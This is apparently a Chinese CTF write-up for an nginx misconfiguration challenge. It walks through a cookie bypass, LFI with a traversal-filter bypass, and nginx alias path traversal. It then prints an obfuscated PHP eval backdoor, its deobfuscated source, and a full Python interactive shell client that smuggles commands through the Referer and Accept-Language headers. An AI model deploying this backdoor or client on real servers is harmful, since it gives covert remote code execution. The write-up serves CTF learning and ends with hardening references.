---
title: 攻防世界 Web_php_wrong_nginx_config
tags:
  - Writeup
  - CTF
date: 2019-10-06 12:35:03
---

![](/assets/images/move/20191006133041.png)

## 0x01 信息收集

dirsearch 扫描一下，获取如下信息：

1. robots.txt

```php
User-agent: *Disallow:
hint.php
Hack.php
```

- 访问 hint.php 提示: 配置文件也许有问题呀：`/etc/nginx/sites-enabled/site.conf`.

- 访问 hack.php 空白页面，留意到 Cookie `isLogin` 值为 0，尝试修改为 1.

2. `/admin/`、`/admin/admin.php`、`/admin/index.php`路径存在。

isLogin 置 1 时访问 /admin/admin.php 进入管理中心页面，URL 如下：

```php
/admin/admin.php?file=index&ext=php
```

## 0x02 LFI & 目录穿越

/admin/admin.php 处存在任意文件读取，`../`被过滤，可双写绕过，根据提示读取 `site.conf`:

![](/assets/images/move/20191006125911.png)

留意到以下片段：

```php
server {
    location /web-img {
        alias /images/;
        autoindex on;
    }
}
```

这里 设置了 `/web-img` 为 `/images/` 的别名，`autoindex on` 开启了目录遍历，则存在 目录穿越：

`/web-img../` 则相当于 `/images/../` ：

![](/assets/images/move/20191006131051.png)

在 `/web-img../var/www/`下发现 `hack.php.bak`文件：

```php
<?php
$U='_/|U","/-/|U"),ar|Uray|U("/|U","+"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle';
$q='s[|U$i]="";$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui';
$M='l="strtolower|U";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$';
$z='r=@$r[|U"HTTP_R|UEFERER|U"];$r|U|Ua=@$r["HTTP_A|U|UCCEPT_LAN|UGUAGE|U"];if|U($r|Ur&|U&$ra){$u=parse_|Uurl($r';
$k='?:;q=0.([\\|Ud]))?,|U?/",$ra,$m)|U;if($|Uq&&$m){|U|U|U@session_start()|U|U;$s=&$_SESSIO|UN;$ss="|Usubst|Ur";|U|U$s';
$o='|U$l;|U){for|U($j=0;($j|U<$c&&|U|U$i|U<$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};\}\}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r';
$N='|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray("/';
$C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut("|U<$k>$d</$k>"|U);@ses|U|Usion_des|Utroy();\}\}\}\}';
$j='$k|Uh="|U|U42f7";$kf="e9ac";fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U"";fo|Ur($i=0;$i<';
$R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion');
$J='kf|U),|U0,3));$p="|U";for(|U|U$|Uz=1;$z<cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$';
$x='r)|U;pa|Urse|U_str($u["qu|U|Uery"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul("/([\\|U|Uw])[|U\\w-]+|U(';
$f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);
$g=create_function('',$f);
$g();
?>
```

## 0x03 PHP Backdoor

echo $f 得到：

```php
<?php
$kh = "42f7";
$kf = "e9ac";
function x($t, $k)
{
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; $j < $c && $i < $l; $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}
$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr && $ra) {
    $u = parse_url($rr);
    parse_str($u["query"], $q);
    $q = array_values($q);
    preg_match_all("/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/", $ra, $m);
    if ($q && $m) {
        @session_start();
        $s =& $_SESSION;
        $ss = "substr";
        $sl = "strtolower";
        $i = $m[1][0] . $m[1][1];
        $h = $sl($ss(md5($i . $kh), 0, 3));
        $f = $sl($ss(md5($i . $kf), 0, 3));
        $p = "";
        for ($z = 1; $z < count($m[1]); $z++) {
            $p .= $q[$m[2][$z]];
        }
        if (strpos($p, $h) === 0) {
            $s[$i] = "";
            $p = $ss($p, 3);
        }
        if (array_key_exists($i, $s)) {
            $s[$i] .= $p;
            $e = strpos($s[$i], $f);
            if ($e) {
                $k = $kh . $kf;
                ob_start();
                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))), $k)));
                $o = ob_get_contents();
                ob_end_clean();
                $d = base64_encode(x(gzcompress($o), $k));
                print "<{$k}>{$d}</{$k}>";
                @session_destroy();
            }
        }
    }
}
```

为一 PHP 混淆后门程序，在 [一个PHP混淆后门的分析](https://www.cnblogs.com/go2bed/p/5920811.html) 处找到交互式的 Python 2 利用程序：

```python
# encoding: utf-8

from random import randint,choice
from hashlib import md5
import urllib
import string
import zlib
import base64
import requests
import re

def choicePart(seq,amount):
    length = len(seq)
    if length == 0 or length < amount:
        print 'Error Input'
        return None
    result = []
    indexes = []
    count = 0
    while count < amount:
        i = randint(0,length-1)
        if not i in indexes:
            indexes.append(i)
            result.append(seq[i])
            count += 1
            if count == amount:
                return result

def randBytesFlow(amount):
    result = ''
    for i in xrange(amount):
        result += chr(randint(0,255))
    return  result

def randAlpha(amount):
    result = ''
    for i in xrange(amount):
        result += choice(string.ascii_letters)
    return result

def loopXor(text,key):
    result = ''
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = 0
    while iTxt < lenTxt:
        iKey = 0
        while iTxt<lenTxt and iKey<lenKey:
            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
            iTxt += 1
            iKey += 1
    return result


def debugPrint(msg):
    if debugging:
        print msg

# config
debugging = False
keyh = "42f7" # $kh
keyf = "e9ac" # $kf
xorKey = keyh + keyf
url = 'http://111.198.29.45:48754/hack.php'
defaultLang = 'zh-CN'
languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']
proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug

sess = requests.Session()

# generate random Accept-Language only once each session
langTmp = choicePart(languages,3)
indexes = sorted(choicePart(range(1,10),3), reverse=True)

acceptLang = [defaultLang]
for i in xrange(3):
    acceptLang.append(langTmp[i] % (indexes[i],))
acceptLangStr = ','.join(acceptLang)
debugPrint(acceptLangStr)

init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
md5head = (md5(init2Char + keyh).hexdigest())[0:3]
md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))
debugPrint('$i is %s' % (init2Char))
debugPrint('md5 head: %s' % (md5head,))
debugPrint('md5 tail: %s' % (md5tail,))

# Interactive php shell
cmd = raw_input('phpshell > ')
while cmd != '':
    # build junk data in referer
    query = []
    for i in xrange(max(indexes)+1+randint(0,2)):
        key = randAlpha(randint(3,6))
        value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
        query.append((key, value))
    debugPrint('Before insert payload:')
    debugPrint(query)
    debugPrint(urllib.urlencode(query))

    # encode payload
    payload = zlib.compress(cmd)
    payload = loopXor(payload,xorKey)
    payload = base64.urlsafe_b64encode(payload)
    payload = md5head + payload

    # cut payload, replace into referer
    cutIndex = randint(2,len(payload)-3)
    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
    iPiece = 0
    for i in indexes:
        query[i] = (query[i][0],payloadPieces[iPiece])
        iPiece += 1
    referer = url + '?' + urllib.urlencode(query)
    debugPrint('After insert payload, referer is:')
    debugPrint(query)
    debugPrint(referer)

    # send request
    r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)
    html = r.text
    debugPrint(html)

    # process response
    pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))
    output = pattern.findall(html)
    if len(output) == 0:
        print 'Error,  no backdoor response'
        cmd = raw_input('phpshell > ')
        continue
    output = output[0]
    debugPrint(output)
    output = output.decode('base64')
    output = loopXor(output,xorKey)
    output = zlib.decompress(output)
    print output
    cmd = raw_input('phpshell > ')
```

连接上 `hack.php` 即可获取 flag：

![](/assets/images/move/20191006132157.png)

## 0x04 Nginx 安全配置

1. [Wooyun Drops - Nginx安全配置研究](http://drop.cnpanda.net/#!/drops/201.Nginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%A0%94%E7%A9%B6)

2. [Nginx配置不当可能导致的安全问题](https://xz.aliyun.com/t/4855)

3. [利用GIXY发现错误的Nginx配置](https://xz.aliyun.com/t/2692)


